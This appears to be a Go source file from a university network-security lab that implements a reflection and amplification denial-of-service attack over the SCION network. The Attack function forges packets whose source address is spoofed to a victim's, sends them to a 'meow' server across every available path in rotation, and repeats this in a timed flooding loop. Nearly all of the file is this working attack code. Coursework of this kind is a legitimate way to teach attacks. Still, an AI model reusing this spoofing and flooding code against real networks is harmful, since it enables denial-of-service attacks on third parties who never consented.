package client

import (
	// All of these imports were used for the mastersolution
	// "encoding/json"
	"fmt"
	"log"
	"net"
	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"time"

	"github.com/scionproto/scion/go/lib/snet"
	// "ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	//"github.com/scionproto/scion/go/lib/spath"
	"github.com/scionproto/scion/go/lib/common"
)

func GenerateAttackPayload() []byte {
	// Amplification Task
	zeroArray := []byte{1}
	return zeroArray
}

// meowSerrverAddr: address and port of meow server (string) = 17-ffaa:0:1119,10.57.114.162:8090
// spoofedAddr: address and port of the victim (snet.UDPAddr)
func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// meow from string to snet.UDPAddr struct
	meowUDPAddr, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		log.Printf("Parsing meow Address produced error: %s", err)
		return
	}

// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// register with dispatcher (desired local address and port) (gives back net.PacketConn object)
	dispatcherConn, port, err := dispatcher.Register(ctx, meowUDPAddr.IA, &net.UDPAddr{IP: ClientIP()}, addr.SvcNone)
	if err != nil {
		log.Printf("Registering with dispatcher produced error: %s", err)
		return
	}
	//fmt.Println("dispatcherConn: ", dispatcherConn)
	fmt.Println("port: ", port)
	fmt.Println("Conn_localAddr: ", dispatcherConn.LocalAddr())



// Both local and remote: query path to victim from daemon and revert (revert empty allowed)
// SCION daemon
	sciondAddr := SCIONDAddress()
	fmt.Println("sciondAddr: ", sciondAddr)

	// gives back a Connector object
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// addresses need to be of type addr.IA
	dstIA := spoofedAddr.IA
	srcIA := meowUDPAddr.IA
	snetPathArray, err := sciondConn.Paths(ctx, dstIA, srcIA, daemon.PathReqFlags{Refresh: false, Hidden: false})
	if err != nil {
		log.Printf("Daemon searching for paths produced error: %s", err)
		return
	}

	// test print of paths
	fmt.Println("snetPathArray: ", snetPathArray)
	for i := 0; i < len(snetPathArray); i++ {
		//fmt.Println("element: ", snetPathArray[i])
		// yields type spath.Path
		path := snetPathArray[i].Path()
		path.Reverse()
	}


	// build SCION packet: SCION header, UDP header, payload
	// FOT TESTING
	testPath := snetPathArray[0].Path()
	testPath.Reverse()

	// send off SCION packet - via dispatcher? .WriteTo
	scionPacket := &snet.Packet{
		// Bytes field, buffer for packet data
		Bytes: make([]byte, common.SupportedMTU),
		PacketInfo: snet.PacketInfo{
			Destination: snet.SCIONAddress{
				IA: meowUDPAddr.IA,
				Host: addr.HostFromIP(meowUDPAddr.Host.IP),
			},
			Source: snet.SCIONAddress{
				IA: spoofedAddr.IA,
				Host: addr.HostFromIP(spoofedAddr.Host.IP),
			},
			// Path field (spath.Path)
			Path: testPath,
			Payload: snet.UDPPayload{
				SrcPort: uint16(VictimPort()),
				DstPort: uint16(meowUDPAddr.Host.Port),
				Payload: payload,
			},
		},
	}

	// send traffic to meow
	dispPort := DispatcherPort()
	nextHop := &net.UDPAddr{IP: meowUDPAddr.Host.IP, Port: dispPort}
	scionPacket.Serialize()
	if err != nil {
		log.Printf("Packet serialization produced error: %s", err)
		return
	}

	counter := 0
	elems := len(snetPathArray)

	// ATTACK
	for start := time.Now(); time.Since(start) < AttackDuration(); {

		// prepare path
		pathUsed := snetPathArray[counter % elems].Path()
		pathUsed.Reverse()
		scionPacket.PacketInfo.Path = pathUsed
		scionPacket.Serialize()

		// dispatcher writeTo
		n, _ := dispatcherConn.WriteTo(scionPacket.Bytes, nextHop)
		fmt.Println("n: ", n)
		time.Sleep(1 * time.Millisecond)

		counter += 1
		
	}

	return nil
}
